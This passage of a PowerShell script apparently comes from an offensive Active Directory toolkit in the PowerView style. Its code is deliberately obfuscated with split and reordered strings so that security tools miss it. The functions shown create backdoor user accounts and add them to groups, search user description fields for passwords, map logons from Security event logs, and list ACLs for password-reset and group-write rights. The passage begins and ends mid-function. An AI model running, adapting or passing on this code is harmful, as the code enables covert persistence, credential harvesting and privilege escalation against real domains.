            &("{1}{2}{0}"-f("{1}{2}{0}"-f'g','-War','nin'),'Wr','ite') (("{1}{0}"-f 'o','Err')+'r '+'i'+'n '+'g'+("{2}{0}{1}"-f 'i','n','rabb')+'g '+("$Domain "+'')+("{0}{1}" -f 'o','bje')+'ct')
            return ${NU`ll}
        }

        
        &("{0}{1}"-f("{1}{0}"-f'-T','Add'),'ype') -AssemblyName ("{5}{1}{7}{8}{2}{4}{9}{3}{10}{6}{0}"-f't','ste','e','unt',("{0}{2}{1}" -f'rvi','.','ces'),'Sy','n',("{0}{1}" -f'm.D','i'),("{1}{0}"-f 'S','rectory'),("{1}{0}"-f'co','Ac'),("{1}{0}"-f 'ageme','Man'))

        
        
        ${coNt`Ext} = &("{1}{2}{3}{0}"-f("{0}{1}"-f 'jec','t'),'Ne','w','-Ob') -TypeName ("{2}{3}{1}{0}{4}{5}{14}{11}{8}{7}{13}{10}{12}{9}{6}" -f("{0}{1}{2}" -f 'ire','cto','r'),("{0}{1}" -f'tem','.D'),'Sy','s',("{1}{0}{2}" -f'vices.','ySer','Acc'),'oun','xt','t',("{2}{1}{0}" -f 'en','gem','na'),'te','al','Ma','Con',("{0}{2}{1}"-f'.','cip','Prin'),'t') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"DOM`AiN"), ${d`o`mAiNObje`ct}

        
        ${uS`er} = &("{0}{2}{1}"-f 'Ne',("{0}{1}"-f 'bjec','t'),'w-O') -TypeName ("{3}{10}{8}{0}{5}{7}{1}{6}{4}{9}{2}"-f("{4}{2}{0}{1}{3}" -f'to','r','c','yServic','.Dire'),("{1}{0}{2}"-f'nage','tMa','m'),'l',("{1}{0}"-f 'yst','S'),("{1}{0}"-f 'cip','n'),("{1}{0}"-f'Acc','es.'),("{0}{2}{1}"-f'ent.','rPri','Use'),'oun','m','a','e') -ArgumentList ${C`onteXt}

        
        ${uS`er}."N`AMe" = ${US`er`NAme}
        ${U`seR}."S`Ama`ccOUn`TnAME" = ${use`Rna`Me}
        ${uS`er}."p`AS`sWo`Rd`NOT`ReQUIrED" = ${fAL`se}
        ${U`ser}.("{0}{2}{1}"-f'Se',("{1}{0}" -f'rd','wo'),("{0}{1}" -f 'tP','ass'))."I`NVO`ke"(${P`AsSW`Ord})
        ${u`Ser}."enAB`led" = ${t`RuE}

        &("{3}{2}{1}{0}"-f'e','os','erb',("{0}{1}"-f 'Wr','ite-V')) (("{0}{1}"-f 'Cr','ea')+'t'+("{0}{1}"-f 'ing',' ')+'u'+("{0}{1}" -f 's','er ')+("$UserName "+'')+'t'+'o '+("{0}{1}" -f 'w','ith')+' '+'pa'+'ssw'+("{0}{1}" -f'ord',' ')+("'$Password' "+'')+'i'+'n '+'do'+'ma'+'in '+"$Domain")

        try {
            
            ${u`Ser}.("{0}{1}" -f 'Sav','e')."In`VOKE"()
            ('['+'*] '+("{1}{0}" -f 'er','Us')+' '+("$UserName "+'')+'su'+("{1}{0}" -f'ess','cc')+'ful'+'ly '+'cr'+'eat'+'ed '+'in'+' '+'dom'+("{0}{1}"-f 'ain',' ')+"$Domain")
        }
        catch {
            &("{1}{0}{2}" -f ("{0}{1}"-f'e-Warn','i'),("{0}{1}"-f 'Wri','t'),'ng') ("{2}{1}{4}{0}{3}"-f'st',("{0}{1}"-f 'dy ','ex'),("{2}{1}{0}{3}" -f 'al','er ','[!] Us','rea'),'s!','i')
            return
        }
    }
    else {
        
        &("{1}{2}{0}"-f ("{0}{1}" -f'e','rbose'),("{0}{2}{1}"-f'W','e-','rit'),'V') ('C'+'rea'+("{1}{0}"-f'g ','tin')+'u'+("{0}{1}" -f 'se','r ')+("$UserName "+'')+'to'+' '+'w'+("{0}{1}" -f'ith',' ')+'p'+'as'+("{1}{0}" -f'd ','swor')+("'$Password' "+'')+'o'+'n '+"$ComputerName")

        
        ${Ob`j`OU} = [ADSI]"WinNT://$ComputerName"
        ${Ob`J`USer} = ${o`BJOu}.("{1}{0}"-f'e',("{1}{0}"-f'at','Cre'))."iNvO`kE"(("{0}{1}" -f'U','ser'), ${uSe`RNA`ME})
        ${ObJu`ser}.("{2}{1}{0}" -f ("{1}{0}" -f 'word','s'),("{0}{1}" -f 'etPa','s'),'S')."iN`VOKE"(${P`Ass`woRd})

        
        try {
            ${Nu`ll} = ${ob`J`USEr}.("{2}{0}{1}" -f 'f','o',("{1}{0}"-f 'tIn','Se'))."i`NvOKe"()
            ('[*'+'] '+'Us'+'er '+("$UserName "+'')+'su'+("{2}{1}{0}"-f'sf','es','cc')+'ull'+'y '+("{0}{1}"-f'crea','t')+'ed '+'o'+'n '+'ho'+'st '+"$ComputerName")
        }
        catch {
            &("{0}{2}{1}" -f'W',("{0}{1}{2}" -f'te-W','arni','ng'),'ri') ("{6}{4}{2}{3}{7}{5}{8}{0}{1}"-f's','!','c',("{1}{0}{2}"-f'nt','ou',' a'),' Ac',("{0}{1}"-f' exi','s'),'[!]',("{2}{1}{0}" -f'y','read','l'),'t')
            return
        }
    }

    
    if (${G`ROU`pn`AME}) {
        
        if (${do`Ma`iN}) {
            &("{0}{2}{1}{3}{4}" -f ("{1}{0}{2}" -f 'N','Add-','etG'),'p','rou','U','ser') -UserName ${u`seRn`AMe} -GroupName ${Gr`ouPN`A`me} -Domain ${DOm`AiN}
            ('['+'*] '+'Use'+'r '+("$UserName "+'')+("{1}{0}{2}" -f'c','su','cess')+'fu'+'l'+'ly '+("{0}{1}"-f'a','dde')+'d '+'to'+' '+'g'+("{0}{1}"-f'r','oup ')+("$GroupName "+'')+'in'+' '+("{1}{0}" -f'ma','do')+'i'+'n '+"$Domain")
        }
        
        else {
            &("{3}{0}{2}{1}{4}" -f 'tGr','u','o',("{1}{2}{0}"-f'e','A','dd-N'),("{0}{1}"-f 'p','User')) -UserName ${U`sER`N`AMe} -GroupName ${g`R`ouPNAME} -ComputerName ${CO`mpUt`er`N`AmE}
            ('[*'+'] '+'U'+("{0}{1}" -f 's','er ')+("$UserName "+'')+'s'+("{1}{0}" -f'cess','uc')+'ful'+'ly '+'a'+("{0}{1}"-f 'd','ded ')+'to'+' '+'gr'+("{0}{1}"-f'oup',' ')+("$GroupName "+'')+'on'+' '+("{1}{0}"-f 't','hos')+' '+"$ComputerName")
        }
    }
}


function adD`-n`Etg`R`ouPU`Ser {


    [CmdletBinding()]
    param(
        [Parameter(maNDatoRY = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Us`ER`NAMe},

        [Parameter(MaNDAtory = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${gRoU`PNA`Me},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'me','H',{"{0}{1}" -f 'o','stNa'}})]
        [String]
        ${cOMP`UTe`RNA`ME},

        [String]
        ${doma`in}
    )

    
    &("{2}{0}{1}" -f("{0}{1}"-f '-T','yp'),'e','Add') -AssemblyName ("{7}{8}{4}{10}{5}{6}{2}{3}{0}{1}{9}" -f("{0}{1}" -f 's.','Acc'),("{2}{0}{1}"-f'Ma','na','ount'),'ic','e',("{0}{1}" -f 'te','m.D'),'r',("{0}{1}"-f 'ySe','rv'),'S','ys',("{1}{0}" -f 'nt','geme'),("{1}{0}" -f'to','irec'))

    
    if(${Co`mP`UTE`RN`AME} -and (${COMp`U`Te`RN`AmE} -ne ("{1}{0}{2}"-f'lho',("{0}{1}"-f 'loc','a'),'st'))) {
        try {
            &("{0}{2}{1}"-f ("{0}{1}"-f 'Wr','ite-V'),'se',("{0}{1}" -f'erb','o')) (("{1}{0}"-f 'ng','Addi')+' '+'use'+'r '+("$UserName "+'')+'t'+'o '+("$GroupName "+'')+'o'+'n '+'ho'+'st '+"$ComputerName")
            ([ADSI]"WinNT://$ComputerName/$GroupName,group").("{0}{1}"-f 'ad','d')."IN`VoKE"("WinNT://$ComputerName/$UserName,user")
            ('['+'*] '+'Use'+'r '+("$UserName "+'')+'su'+("{0}{1}" -f'cc','essful')+'ly '+'ad'+("{0}{1}" -f 'd','ed ')+'to'+' '+'gro'+'up '+("$GroupName "+'')+'o'+'n '+"$ComputerName")
        }
        catch {
            &("{2}{0}{4}{3}{1}" -f 'r',("{0}{1}"-f 'rn','ing'),'W','-Wa','ite') ('[!]'+' '+("{0}{1}"-f'E','rror')+' '+'a'+("{0}{1}"-f 'ddi','ng ')+'use'+'r '+("$UserName "+'')+'to'+' '+'gro'+'up '+("$GroupName "+'')+'on'+' '+"$ComputerName")
            return
        }
    }

    
    else {
        try {
            if (${D`Om`AiN}) {
                &("{1}{2}{0}"-f'se',("{1}{0}"-f 'e','Writ'),("{0}{1}"-f'-','Verbo')) ('Ad'+("{0}{1}"-f'di','ng ')+'u'+("{0}{1}"-f'ser',' ')+("$UserName "+'')+'to'+' '+("$GroupName "+'')+'o'+'n '+("{0}{1}" -f'do','ma')+'in '+"$Domain")
                ${cT} = [System.DirectoryServices.AccountManagement.ContextType]::"D`oMAin"
                ${dOm`AinO`B`JEct} = &("{3}{1}{2}{0}" -f("{1}{0}{2}"-f 'ma','tDo','in'),'et','-Ne','G') -Domain ${D`OMA`IN}
                if(-not ${DOm`AI`NobJ`ECT}) {
                    return ${nu`Ll}
                }
                
                ${cO`N`TExT} = &("{0}{2}{1}" -f 'N','ct',("{2}{1}{0}"-f '-Obje','w','e')) -TypeName ("{7}{2}{3}{5}{11}{4}{1}{6}{9}{10}{0}{8}" -f 'alC',("{0}{3}{2}{1}"-f'es.Ac','t','n','cou'),("{2}{1}{0}" -f 're','i','m.D'),'ct','c','ory',("{1}{0}"-f 'a','Man'),("{1}{0}"-f'yste','S'),("{0}{1}"-f'onte','xt'),("{0}{1}"-f'ge','ment.'),("{1}{0}"-f'ip','Princ'),("{1}{0}" -f'rvi','Se')) -ArgumentList ${C`T}, ${D`O`MA`i`NObJeCt}            
            }
            else {
                
                &("{2}{0}{1}" -f ("{1}{0}" -f 'o','te-Verb'),'se','Wri') (("{0}{1}"-f 'Addi','n')+'g '+("{0}{1}"-f'use','r')+' '+("$UserName "+'')+'to'+' '+("$GroupName "+'')+'on'+' '+'l'+("{0}{1}" -f'o','cal')+("{0}{1}" -f 'hos','t'))
                ${C`OntexT} = &("{2}{1}{0}"-f't',("{0}{1}"-f'-Obje','c'),'New') ("{3}{14}{11}{8}{10}{9}{16}{2}{0}{15}{13}{12}{4}{6}{7}{1}{5}"-f("{0}{1}" -f 'unt','M'),("{0}{2}{1}" -f 'ipal','te','Con'),'o','S',("{0}{1}" -f 'n','t.Pr'),'xt','i','nc',("{0}{1}"-f 'e','cto'),'erv','ryS',("{1}{0}{2}" -f '.Di','stem','r'),("{0}{1}"-f 'gem','e'),'a','y','an',("{1}{2}{0}"-f 's.Acc','i','ce'))([System.DirectoryServices.AccountManagement.ContextType]::"M`A`chiNe", ${ENv:C`o`MpUT`eRnAmE})
            }

            
            ${G`RO`UP} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{2}{1}{0}"-f 'ty','ti',("{2}{1}{0}"-f'ndByIden','i','F'))."iNV`OkE"(${Co`NteXt},${g`R`Oup`NamE})

            
            ${gro`Up}."me`mB`eRS"."A`dD"(${C`oN`TeXt}, [System.DirectoryServices.AccountManagement.IdentityType]::"sam`AcCOU`Ntname", ${use`RnAmE})

            
            ${G`R`oUP}.("{1}{0}"-f 'ave','S')."i`NVoKe"()
        }
        catch {
            &("{2}{1}{0}"-f 'ng','rni',("{1}{0}"-f 'rite-Wa','W')) (("{0}{1}" -f'Erro','r')+' '+("{1}{0}"-f'ding','ad')+' '+("$UserName "+'')+'to'+' '+("$GroupName "+'')+': '+"$_")
        }
    }
}


function gET-`UseRP`R`O`pe`R`Ty {


    [CmdletBinding()]
    param(
        [String[]]
        ${PR`Oper`T`Ies},

        [String]
        ${Do`ma`in},
        
        [String]
        ${DoMA`INCO`N`T`RolLER},

        [ValidateRange(1,10000)] 
        [Int]
        ${Pa`G`eSiZe} = 200
    )

    if(${Pr`oPe`RtIEs}) {
        
        ${PR`opERT`i`eS} = ,("{0}{1}" -f 'n','ame') + ${PRopE`RT`i`eS}
        &("{1}{2}{0}" -f'ser','G',("{2}{1}{0}" -f'etU','t-N','e')) -Domain ${D`OMAIn} -DomainController ${dOMaInCONt`R`oL`lEr} -PageSize ${p`A`Gesize} | &("{3}{2}{0}{1}" -f 'O',("{0}{1}"-f'b','ject'),("{1}{0}" -f'ct-','ele'),'S') -Property ${pRO`Pe`Rti`Es}
    }
    else {
        
        &("{0}{1}{3}{2}"-f'G','et',("{0}{1}" -f'tU','ser'),'-Ne') -Domain ${D`o`mAiN} -DomainController ${doM`A`in`cOnT`RoLlEr} -PageSize ${p`A`gEsIze} | &("{3}{2}{0}{1}"-f'le',("{1}{2}{0}" -f 'ect','ct-Ob','j'),'e','S') -First 1 | &("{0}{3}{2}{1}"-f ("{0}{1}"-f'G','et-'),'er','b','Mem') -MemberType ("{1}{0}{2}" -f ("{1}{0}"-f'pe','ro'),'*P','rty') | &("{2}{0}{1}" -f("{1}{0}"-f'ct-O','e'),("{0}{1}"-f 'bj','ect'),'Sel') -Property ("{0}{1}"-f'Na','me')
    }
}


function Find-U`seRFi`eLd {


    [CmdletBinding()]
    param(
        [Parameter(PosITIoN=0,vaLueFROMpiPELIne=${T`Rue})]
        [String]
        ${sEA`RchT`e`RM} = ("{1}{0}" -f 'ss','pa'),

        [String]
        ${S`EaRC`HF`IeLD} = ("{0}{1}{2}"-f("{1}{0}{2}" -f'i','descr','pt'),'io','n'),

        [String]
        ${ADSp`AtH},

        [String]
        ${D`omaiN},

        [String]
        ${D`oMAI`NCONT`ROlleR},

        [ValidateRange(1,10000)] 
        [Int]
        ${Pa`ge`siZE} = 200
    )

    process {
        &("{3}{2}{0}{1}" -f 't-',("{0}{1}"-f'Net','User'),'e','G') -ADSpath ${aD`spA`Th} -Domain ${d`OM`AIn} -DomainController ${dom`AI`NC`OnT`RO`llEr} -Filter "($SearchField=*$SearchTerm*)" -PageSize ${pagE`sI`zE} | &("{4}{0}{2}{1}{3}" -f("{0}{1}"-f'e','lec'),("{1}{0}"-f 'Obje','-'),'t','ct','S') ("{1}{0}{2}" -f("{0}{1}"-f 'untn','a'),("{2}{0}{1}"-f 'c','co','sama'),'me'),${S`eA`RC`HfiELd}
    }
}


function GeT-`Use`R`EV`EnT {


    Param(
        [String]
        ${CO`mPU`TerN`A`Me} = ${E`Nv:c`oM`puTERNaME},

        [String]
        [ValidateSet({"{1}{0}" -f 'on','log'},"tgt","all")]
        ${ev`EntTy`PE} = ("{0}{1}"-f'l',("{0}{1}"-f 'ogo','n')),

        [DateTime]
        ${DaT`eST`A`RT}=  (  &("{0}{1}" -f 'ItE','m') ('VAR'+'i'+("{0}{1}{2}" -f 'A','bl','e:5M')+'bI'))."V`ALue"::"ToD`Ay".("{1}{0}"-f("{0}{1}"-f'dD','ays'),'Ad')."IN`Voke"(-5)
    )

    if(${ev`eNtt`y`PE}.("{0}{2}{1}"-f'To','er','Low')."i`NV`OkE"() -like ("{1}{0}"-f("{0}{1}"-f'og','on'),'l')) {
        [Int32[]]${i`D} = @(4624)
    }
    elseif(${EvENT`T`Y`PE}.("{0}{1}"-f("{0}{1}" -f'To','Low'),'er')."iN`V`oKe"() -like "tgt") {
        [Int32[]]${i`D} = @(4768)
    }
    else {
        [Int32[]]${id} = @(4624, 4768)
    }

    
    &("{0}{3}{2}{1}" -f ("{1}{0}" -f't-','Ge'),'t','en',("{1}{0}" -f 'inEv','W')) -ComputerName ${C`Omp`Ut`eRnA`ME} -FilterHashTable @{ ("{0}{1}{2}"-f'Log','Nam','e') = ("{2}{1}{0}"-f("{0}{1}" -f 'r','ity'),'cu','Se'); ('ID')=${i`d}; ("{0}{1}" -f'Sta',("{0}{1}"-f'rt','Time'))=${DaTeSt`A`Rt}} -ErrorAction ("{1}{3}{2}{0}"-f("{0}{1}" -f 'tin','ue'),("{0}{1}"-f'Si','le'),("{1}{0}"-f'Con','y'),'ntl') | &("{0}{2}{3}{1}"-f 'F','ct','orE',("{0}{1}"-f 'ac','h-Obje')) {

        if(${i`d} -contains 4624) {    
            
            if(${_}."MEs`sAge" -match ((("{2}{9}{8}{6}{1}{4}{10}{7}{5}{3}{0}"-f((("{2}{1}{0}" -f 'n:))','o','og'))),'Typ',((("{0}{2}{1}{3}" -f '(',')(?<=L','?s','o'))),("{0}{3}{5}{1}{4}{2}"-f 'on Lev','hN','L','el:','ew ','wd'),'e:)',("{0}{1}{2}"-f'er','so','nati'),' ','mp','n','go',((("{0}{1}" -f'.*?(?','=(I')))))."REp`la`Ce"('wdh',[STrIng][chaR]124))) {
                if(${MAt`CHES}) {
                    ${LO`gon`TyPe} = ${mAt`Ch`eS}[0].("{0}{1}"-f 'tri','m')."INvO`kE"()
                    ${M`ATchEs} = ${n`ULL}
                }
            }
            else {
                ${LOGO`N`Type} = ""
            }

            
            if ((${Log`oN`T`ypE} -eq 2) -or (${L`og`o`NTypE} -eq 3)) {
                try {
                    
                    if(${_}."Me`S`SAGE" -match (("{10}{5}{6}{8}{9}{7}{11}{3}{0}{4}{2}{1}{12}" -f'o',("{1}{2}{0}"-f'rmati',' Inf','o'),'s','r','ces','=N','e',(("{0}{1}" -f ').*','?(')),("{0}{1}" -f 'w L','ogo'),'n:',((("{1}{0}" -f '<','(?s)(?'))),'?=P',((("{1}{0}"-f ':)','on')))))) {
                        if(${mA`Tc`heS}) {
                            ${U`s`ernAMe} = ${MA`TcH`es}[0].("{1}{0}" -f'it','spl')."I`Nv`Oke"("`n")[2].("{0}{1}" -f 'sp','lit')."INV`oKE"(":")[1].("{0}{1}" -f 't','rim')."INVO`Ke"()
                            ${do`mAIN} = ${MA`TC`HES}[0].("{0}{1}" -f ("{0}{1}"-f 'sp','li'),'t')."INvO`Ke"("`n")[3].("{0}{1}"-f 'sp','lit')."I`NVOKe"(":")[1].("{0}{1}"-f't','rim')."IN`Vo`ke"()
                            ${M`AtcHEs} = ${NU`LL}
                        }
                    }
                    if(${_}."me`ssAgE" -match (("{7}{4}{6}{1}{3}{5}{0}{2}"-f (("{0}{1}"-f 'on:)','.*?(')),'rm',((("{0}{2}{1}{3}{4}" -f'?=S','ce Por','our','t',':)'))),'at','<=N','i',("{0}{2}{1}"-f'etwo','Info','rk '),((("{1}{0}{2}" -f 's)','(?','(?')))))) {
                        if(${mat`C`HES}) {
                            ${A`dDREss} = ${ma`T`CHeS}[0].("{0}{1}"-f("{0}{1}" -f's','pli'),'t')."invo`Ke"("`n")[2].("{0}{1}"-f'sp','lit')."I`N`VoKE"(":")[1].("{1}{0}"-f'rim','t')."iNv`oke"()
                            ${mA`TcHeS} = ${n`Ull}
                        }
                    }

                    
                    if (${USER`N`AME} -and (-not ${U`Sern`AME}.("{0}{1}{2}" -f 'e','nds',("{0}{1}"-f 'W','ith'))."InV`OKE"('$')) -and (${USe`Rn`AMe} -ne ("{4}{3}{2}{0}{1}" -f ("{0}{1}" -f 'S',' LOG'),'ON',("{0}{1}" -f'YM','OU'),'NON','A'))) {
                        ${logonE`Vent`p`Ro`per`Ties} = @{
                            ("{0}{1}" -f("{1}{0}"-f 'ma','Do'),'in') = ${d`o`maIn}
                            ("{3}{1}{2}{0}" -f'ame',("{0}{1}" -f'mpu','te'),'rN','Co') = ${C`Ompu`TeR`NAME}
                            ("{1}{2}{0}" -f 'me',("{0}{1}"-f'Us','er'),'na') = ${u`SerN`AME}
                            ("{1}{0}{2}"-f 's',("{1}{0}"-f 'e','Addr'),'s') = ${Ad`DRESs}
                            'ID' = ("{0}{1}" -f '462','4')
                            ("{2}{0}{1}" -f'on',("{1}{0}"-f'e','Typ'),'Log') = ${l`Og`ontYpe}
                            ("{0}{1}" -f 'Tim','e') = ${_}."ti`meCr`eaT`ed"
                        }
                        &("{1}{2}{0}"-f("{0}{1}" -f 'b','ject'),'N',("{1}{0}" -f '-O','ew')) -TypeName ("{2}{1}{0}" -f'ct','je',("{1}{0}"-f'SOb','P')) -Property ${Lo`gO`Ne`V`en`T`PropERties}
                    }
                }
                catch {
                    &("{2}{0}{1}" -f ("{1}{0}" -f'eb','ite-D'),'ug','Wr') ('Er'+("{1}{0}" -f ' ','ror')+("{1}{0}" -f's','par')+'ing'+' '+("{1}{0}" -f'en','ev')+'t '+'l'+("{0}{1}"-f'og','s: ')+"$_")
                }
            }
        }
        if(${ID} -contains 4768) {
            
            try {
                if(${_}."M`e`sSaGe" -match (("{2}{0}{4}{10}{1}{7}{3}{6}{8}{5}{9}" -f(("{1}{2}{0}"-f'c','?s)(?<=','A')),'rma','(','?',("{1}{0}" -f'unt','co'),'a',((("{0}{2}{3}{1}" -f '(?=','o','Ser','vice Inf'))),((("{1}{0}"-f 'ion:).*','t'))),'rm',((("{0}{1}" -f 'ti','on:)'))),("{1}{0}"-f'Info',' ')))) {
                    if(${m`ATCH`Es}) {
                        ${uSEr`N`AMe} = ${MaT`C`heS}[0].("{1}{0}"-f 'lit','sp')."I`NVOke"("`n")[1].("{0}{1}"-f'sp','lit')."inv`Oke"(":")[1].("{1}{0}" -f'im','tr')."i`NvOkE"()
                        ${Do`M`AiN} = ${mAT`cHES}[0].("{0}{1}" -f ("{1}{0}" -f'i','spl'),'t')."I`N`VoKe"("`n")[2].("{1}{0}"-f 't',("{1}{0}" -f'li','sp'))."in`VOke"(":")[1].("{0}{1}" -f't','rim')."IN`VO`Ke"()
                        ${M`AtchEs} = ${NU`ll}
                    }
                }

                if(${_}."meS`s`AGE" -match (("{7}{1}{10}{6}{8}{3}{11}{9}{0}{5}{2}{4}" -f 'n',(("{0}{1}{2}"-f '?s)(','?<','=N')),("{0}{2}{1}" -f 'n','matio','for'),(("{0}{1}{2}{3}"-f 'a','tion:).','*','?(')),'n:)',("{1}{0}" -f 'I','al '),("{1}{0}"-f'for','In'),'(','m',("{1}{2}{0}" -f 'io','Addi','t'),("{0}{1}"-f'e','twork '),'?='))) {
                    if(${mAt`ch`Es}) {
                        ${aDdr`E`Ss} = ${m`ATCH`ES}[0].("{0}{1}" -f'sp','lit')."inVo`ke"("`n")[1].("{0}{1}" -f ("{0}{1}" -f 'sp','li'),'t')."inVo`KE"(":")[-1].("{1}{0}"-f 'im','tr')."In`Voke"()
                        ${m`Atc`hEs} = ${n`UlL}
                    }
                }

                ${lOg`ONE`V`EnTPROpE`Rti`es} = @{
                    ("{1}{0}"-f 'ain','Dom') = ${Do`MA`IN}
                    ("{0}{1}{2}{3}"-f 'Com',("{0}{1}" -f'pute','r'),'N','ame') = ${CO`mPuTERN`AMe}
                    ("{0}{1}" -f ("{1}{0}" -f'nam','User'),'e') = ${US`Er`Name}
                    ("{1}{0}{2}" -f ("{0}{1}" -f'd','dre'),'A','ss') = ${Ad`DReSs}
                    'ID' = ("{1}{0}" -f'68','47')
                    ("{1}{2}{0}"-f ("{0}{1}"-f 'T','ype'),'L',("{1}{0}"-f'on','og')) = ''
                    ("{1}{0}" -f'e','Tim') = ${_}."TImEcRE`A`T`ED"
                }

                &("{1}{2}{0}" -f 'ct',("{1}{0}"-f'O','New-'),'bje') -TypeName ("{0}{1}" -f ("{1}{0}"-f'bj','PSO'),'ect') -Property ${LogoN`e`V`EntpRop`ER`TiES}
            }
            catch {
                &("{1}{2}{3}{0}"-f 'ug',("{0}{1}" -f'Wri','t'),'e-D','eb') (("{1}{0}"-f'or','Err')+' '+'p'+("{0}{1}"-f'a','rsi')+'ng '+'e'+("{1}{0}"-f ' ','vent')+'l'+("{0}{1}"-f 'o','gs: ')+"$_")
            }
        }
    }
}


function GET`-o`BJeC`TAcl {


    [CmdletBinding()]
    Param (
        [Parameter(ValuefRoMPipElIne=${t`Rue})]
        [String]
        ${sa`MAcc`ouN`TN`AMe},

        [String]
        ${Na`me} = "*",

        [Alias('DN')]
        [String]
        ${DIS`TI`Ng`UiSHE`DNAMe} = "*",

        [Switch]
        ${RESOlvE`gui`Ds},

        [String]
        ${Fi`lT`Er},

        [String]
        ${a`dsp`Ath},

        [String]
        ${A`DSPre`Fix},

        [String]
        [ValidateSet("All",{"{0}{1}{2}" -f ("{0}{1}"-f 'R','ese'),{"{1}{0}" -f 'Pas','t'},{"{1}{0}"-f'd','swor'}},{"{1}{2}{0}{3}" -f("{0}{1}" -f'Me','mb'),'W',{"{1}{0}" -f'e','rit'},'ers'})]
        ${riGHtSfI`l`T`eR},

        [String]
        ${d`OMaIN},

        [String]
        ${dOmAincO`N`Tro`lLer},

        [ValidateRange(1,10000)] 
        [Int]
        ${pA`gesi`ZE} = 200
    )

    begin {
        ${s`EARcH`eR} = &("{2}{1}{4}{5}{0}{3}"-f("{1}{0}" -f'he','arc'),("{0}{1}" -f 't-D','om'),'Ge','r','a',("{1}{0}"-f 'Se','in')) -Domain ${DO`M`AIN} -DomainController ${dOmainc`o`N`TRoL`ler} -ADSpath ${Adsp`A`Th} -ADSprefix ${ad`spR`EFIx} -PageSize ${pA`gE`SizE}

        
        if(${r`eSOlVeG`UIDS}) {
            ${gu`ids} = &("{3}{0}{1}{2}"-f '-G',("{1}{0}"-f'IDMa','U'),'p','Get') -Domain ${Dom`AIn} -DomainController ${D`oM`AIn`cON`TROLLer} -PageSize ${Pag`e`SIZe}
        }
    }

    process {

        if (${seA`RC`Her}) {

            if(${Sam`Ac`cOUNTna`Me}) {
                ${SeaRC`H`er}."FIlt`ER"="(&(samaccountname=$SamAccountName)(name=$Name)(distinguishedname=$DistinguishedName)$Filter)"  
            }
            else {
                ${sEA`R`cher}."FI`LTeR"="(&(name=$Name)(distinguishedname=$DistinguishedName)$Filter)"  
            }
  
            try {
                ${Se`ArC`hEr}.("{1}{0}"-f 'll',("{1}{0}" -f 'ndA','Fi'))."in`V`oKe"() | &("{2}{1}{0}"-f("{2}{1}{0}"-f 'ct','e','-Obj'),("{0}{1}"-f 'her','e'),'W') {${_}} | &("{0}{2}{1}{3}" -f'Fo',("{0}{1}"-f'a','ch-O'),'re',("{1}{0}" -f 'ject','b')) {
                    ${O`B`JeCT} = [adsi](${_}."P`Ath")
                    if(${OBj`e`CT}."dis`TIN`GUI`SHED`Na`mE") {
                        ${acC`eSS} = ${O`B`jEcT}."PS`BASe"."OBJ`e`CtSEc`UrI`TY"."Ac`CEsS"
                        ${A`C`cESS} | &("{1}{2}{0}"-f("{1}{2}{0}" -f't','ch-O','bjec'),("{0}{1}" -f 'For','E'),'a') {
                            ${_} | &("{1}{2}{0}"-f'r',("{1}{0}" -f'-M','Add'),("{1}{0}"-f 'e','emb')) ("{2}{0}{3}{1}" -f("{1}{0}" -f'tePr','o'),'rty','N','ope') ("{0}{1}{2}" -f 'Ob','j',("{1}{0}" -f'N','ectD')) (${OB`j`EcT}."DiS`T`InGUISh`e`D`NAMe"[0])

                            if(${OB`jE`ct}."o`B`jeCtsiD"[0]){
                                ${S} = (&("{2}{3}{0}{1}" -f 'ec','t','N',("{1}{0}"-f'Obj','ew-')) ("{5}{11}{3}{2}{1}{7}{10}{9}{4}{0}{8}{6}" -f 'y','nci','i',("{0}{3}{1}{2}" -f'Secu','ity.','Pr','r'),'it',("{1}{0}"-f 'yste','S'),("{1}{0}"-f 'er','ifi'),("{0}{1}"-f 'pal.','Se'),("{0}{1}"-f'Id','ent'),'r','cu','m.')(${ob`J`eCt}."o`Bj`Ectsid"[0],0))."VaL`UE"
                            }
                            else {
                                ${S} = ${NU`ll}
                            }
                            
                            ${_} | &("{3}{1}{2}{0}"-f 'r','b','e',("{0}{1}{2}" -f'A','d','d-Mem')) ("{2}{0}{1}" -f 'te',("{0}{1}{2}" -f 'Pr','oper','ty'),'No') ("{0}{1}"-f("{0}{1}"-f'O','bje'),("{1}{0}"-f'ID','ctS')) ${s}
                            ${_}
                        }
                    }
                } | &("{2}{3}{1}{0}" -f ("{1}{0}" -f't','-Objec'),("{0}{1}"-f'rEa','ch'),'F','o') {
                    if(${r`IGht`sfIlter}) {
                        ${Gu`idfi`LTer} = Switch (${RiGhTs`F`Il`Ter}) {
                            ("{0}{2}{1}{3}"-f 'Re','r',("{0}{1}{2}" -f'setP','ass','wo'),'d') { ("{8}{1}{7}{3}{6}{0}{5}{4}{2}" -f '0',("{1}{0}"-f '46','-2'),'29',("{0}{1}" -f '-','11d'),("{0}{1}"-f'06e0','5'),("{0}{1}"-f'0','aa0'),("{0}{1}" -f '0-a76','8-'),'d',("{1}{0}" -f'70','002995')) }
                            ("{0}{1}{2}" -f ("{1}{0}"-f 't','Wri'),("{2}{0}{1}"-f 'emb','er','eM'),'s') { ("{1}{4}{5}{2}{3}{6}{0}{7}{8}" -f ("{1}{0}" -f'8','0-a2'),'bf9','9c0',("{2}{1}{0}" -f '-','6','-0de'),'6','7','11d',("{1}{0}"-f '0','5-00aa'),("{1}{2}{0}"-f '2','0304','9e')) }
                            ("{1}{0}{2}"-f'u',("{1}{0}"-f 'fa','De'),'lt') { ("{2}{1}{3}{6}{0}{5}{4}"-f'00',("{2}{1}{0}" -f'000-','00','0'),'00',("{1}{0}" -f'-','0000'),("{1}{0}{2}" -f '000','000','0'),("{1}{0}"-f '0000','-0'),("{1}{0}" -f '000-00','0'))}
                        }
                        if(${_}."oBJE`cTtY`pE" -eq ${G`U`IdfilTEr}) { ${_} }
                    }
                    else {
                        ${_}
                    }
                } | &("{0}{3}{1}{2}"-f 'For','c','t',("{0}{1}{2}"-f 'e','ach-Obj','e')) {
                    if(${G`UIds}) {
                        
                        ${AC`l`prO`PeRTIes} = @{}
                        ${_}."P`S`ObjEcT"."pR`oP`ERtIeS" | &("{0}{2}{1}"-f ("{0}{2}{1}" -f'ForE','O','ach-'),'ect','bj') {
